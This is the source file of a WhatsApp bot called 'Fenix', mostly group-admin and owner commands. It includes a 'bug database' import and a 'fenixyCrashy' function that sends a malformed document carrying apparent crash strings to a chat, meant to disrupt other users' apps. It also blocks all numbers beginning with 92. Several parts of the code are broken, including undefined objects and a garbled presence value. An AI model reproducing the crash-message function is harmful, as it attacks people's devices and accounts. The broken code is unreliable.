/*####################################
                 F E N I X - V 15
             MADE BY F E N I X ID SERVER
       
✅ WhatsApp: wa.me/94773010580
👥 Github: https://github.com/Fenix-server
👥 Github: https://github.com/Botdevillozan
🤖 Youtube https://youtube.com/@fenix_programmer
#####################################*/

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./www-fucking/Fenix9991/lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./www-fucking/Fenix9991/lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./www-fucking/Fenix9991/lib/myfunc')
let afk = require("./www-fucking/Fenix9991/lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./www-fucking/Fenix9991/lib/premiun')
const { fetchBuffer, buffergif } = require("./www-fucking/Fenix9991/lib/myfunc2")

//bug database
const { fenixviz } = require('./www-fucking/fenixviz1')
const { Fenixviz2 } = require('./www-fucking/fenixviz2')
const { Fenixviz3 } = require('./www-fucking/fenixviz3')
const { Fenixviz4 } = require('./www-fucking/fenixviz4')
const { Fenixviz5 } = require('./www-fucking/fenixviz5')
const { Fenixviz6 } = require('./www-fucking/fenixviz6')

//www-fucking/Fenix9991/database
let premium = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/total-hit-user.json'))

//autorep
const VoiceNotefenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/vn.json'))
const Stickerfenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/sticker.json'))
const Imagefenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/image.json'))
const Videofenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/video.json'))
const Docfenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/doc.json'))
const Zipfenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/zip.json'))
const Apkfenix = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var fenixytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var fenixytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var fenixytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var fenixytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var fenixytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var fenixytimewisher = `Good Morning 🌄`
 } 
module.exports = FenixFucking = async (FenixFucking, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcfenix.selectedRowId : (m.mtype == 'templateButtonreplygcfenixMessage') ? m.message.templateButtonreplygcfenixMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcfenix.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await FenixFucking.decodeJid(FenixFucking.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await FenixFucking.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(FenixFucking, m, premium);
//group chat msg by fenix
const replygcfenix = (teks) => {
FenixFucking.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `ꜰᴇɴɪx ᴠ17`,
"body": `ᴠɪᴘ ᴡᴀ ᴏᴡᴇʀ ʙᴏᴛ`,
"previewType": "PHOTO",
"thumbnailUrl": `https://telegra.ph/file/86839df7076e6d7973a18.jpg`,
"thumbnail": fs.readFileSync(`./www-fucking/Fenix9991/dexDump/thumb.jpg`),
"sourceUrl": `https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`}}},
{ quoted: m})
}

//bug functions
const feniximun = (texto) => {
FenixFucking.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgfenix = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `fenix's ur father`
}}
}
async function fenixyCrashy(dgfenix,chat) {
FenixFucking.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgfenix}.${fenixviz}` ,
caption: `${dgfenix + fenixviz}`,
}, {quoted: subscribe_dgfenix })
}
//end bug functions

async function loading () {
var fenixlod = [
"[■□□□□□□□□□] 10%",
"[■■■□□□□□□□] 30%",
"[■■■■■□□□□□] 50%",
"[■■■■■■■□□□] 70%",
"[■■■■■■■■■□] 90%",
"ꜰᴇɴɪx ɪᴅ ꜱᴇʀᴠᴇʀ ᴠ17"
]
let { key } = await FenixFucking.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < fenixlod.length; i++) {
await FenixFucking.sendMessage(from, {text: fenixlod[i], edit: key });
}
}

        if (!FenixFucking.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        if (autoread) {
            FenixFucking.readMessages([m.key])
        }
        if (global.autoTyping) {

        FenixFucking.sendPresenceUpdate('composing', from)


        }

        if (global.autoRecording) {

        FenixFucking.sendPresenceUpdate('recording', from)

        }

        
        //bot number online status, available=online, unavailable=offline
        FenixFucking.sendPresenceUpdate('unavail 11 Ofable', from)
        
        if (global.autorecordtype) {
        let fenixrecordin = ['recording','composing']

        let fenixrecordinfinal = fenixrecordin[Math.floor(Math.random() * fenixrecordin.length)]

        FenixFucking.sendPresenceUpdate(fenixrecordinfinal, from)

        }
        
        if (autobio) {
            FenixFucking.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return FenixFucking.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await FenixFucking.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await FenixFucking.getName(i)}\nFN:${await FenixFucking.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./www-fucking/Fenix9991/database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./www-fucking/Fenix9991/database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let Bhosdikafenix of VoiceNotefenix) {
if (budy === Bhosdikafenix) {
let audiobuffy = fs.readFileSync(`./www-fucking/Fenix9991/audio/${Bhosdikafenix}.mp3`)
FenixFucking.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let Bhosdikafenix of Stickerfenix){
if (budy === Bhosdikafenix){
let stickerbuffy = fs.readFileSync(`./www-fucking/Fenix9991/sticker/${Bhosdikafenix}.webp`)
FenixFucking.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let Bhosdikafenix of Imagefenix){
if (budy === Bhosdikafenix){
let imagebuffy = fs.readFileSync(`./www-fucking/Fenix9991/image/${Bhosdikafenix}.jpg`)
FenixFucking.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let Bhosdikafenix of Videofenix){
if (budy === Bhosdikafenix){
let videobuffy = fs.readFileSync(`./www-fucking/Fenix9991/video/${Bhosdikafenix}.mp4`)
FenixFucking.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
FenixFucking.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let Bhosdikafenix of Apkfenix) {
if (budy === Bhosdikafenix) {
let buffer = fs.readFileSync(`./www-fucking/Fenix9991/apk/${Bhosdikafenix}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
FenixFucking.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let Bhosdikafenix of Zipfenix) {
if (budy === Bhosdikafenix) {
let buffer = fs.readFileSync(`./www-fucking/Fenix9991/zip/${Bhosdikafenix}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let Bhosdikafenix of Docfenix) {
if (budy === Bhosdikafenix) {
let buffer = fs.readFileSync(`./www-fucking/Fenix9991/doc/${Bhosdikafenix}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcfenix(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./www-fucking/Fenix9991/database/afk-user.json', JSON.stringify(_afk))
                FenixFucking.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 2)
                    return replygcfenix(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcfenix("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcfenix("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./www-fucking/Fenix9991/database/premium.json", JSON.stringify(premium));
                    }
                    replygcfenix("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./www-fucking/Fenix9991/database/premium.json", JSON.stringify(premium));
                    replygcfenix("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcfenix(mess.owner)
                let data = require("./www-fucking/Fenix9991/database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                FenixFucking.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcfenix(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcfenix('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcfenix(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcfenix(teks)
                    await sleep(2000)
                    replygcfenix("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcfenix("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replygcfenix(mess.owner)
                    if (!text) return replygcfenix('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcfenix('Link Invalid!')
                    replygcfenix(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await FenixFucking.groupAcceptInvite(result).then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                } catch {
                    replygcfenix('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replygcfenix(mess.owner)
                replygcfenix('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                FenixFucking.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replygcfenix(mess.owner)
                replygcfenix(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcfenix(mess.owner)
                replygcfenix('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcfenix(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcfenix(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcfenix(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcfenix(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcfenix(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcfenix(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcfenix(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcfenix(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return fenixStickOwner()
               if (args.length < 1) return replygcfenix('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcfenix(`${command} Setup done`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcfenix(`${command} Disconnect doned`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcfenix(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcfenix(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcfenix(mess.owner)
                if (args.length < 1) return replygcfenix(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    FenixFucking.public = true
                    replygcfenix(mess.done)
                } else if (q == 'self') {
                    FenixFucking.public = false
                    replygcfenix(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcfenix(mess.owner)
                if (!text) return replygcfenix(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcfenix(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replygcfenix(mess.owner)
                if (!quoted) return replygcfenix(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcfenix(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcfenix(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await FenixFucking.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await FenixFucking.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcfenix(mess.done)
                } else {
                    var memeg = await FenixFucking.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcfenix(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replygcfenix(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await FenixFucking.updateBlockStatus(blockw, 'block').then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcfenix(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await FenixFucking.updateBlockStatus(blockww, 'unblock').then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcfenix(mess.owner)
                if (!m.isGroup) return replygcfenix(mess.group)
                replygcfenix('Bye Everyone 🥺')
                await FenixFucking.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcfenix(mess.owner)
                if (m.isGroup) return replygcfenix(mess.private)
                replygcfenix(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await FenixFucking.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcfenix(mess.owner)
                if (!text) return replygcfenix(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await FenixFucking.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcfenix(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    FenixFucking.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
                                sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcfenix(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcfenix(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("mainFenix17.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcfenix(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcfenix(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcfenix('The message was not sent by a bot!')
                FenixFucking.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcfenix('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcfenix(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    FenixFucking.groupSettingUpdate(m.chat, 'announcement')
                    replygcfenix(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcfenix('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcfenix(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    FenixFucking.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcfenix(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await FenixFucking.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await FenixFucking.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await FenixFucking.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await FenixFucking.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcfenix(json(res))).catch((err) => replygcfenix(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (!text) return 'Text ?'
                await FenixFucking.groupUpdateSubject(m.chat, text).then((res) => replygcfenix(mess.success)).catch((err) => replygcfenix(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcfenix(mess.group)
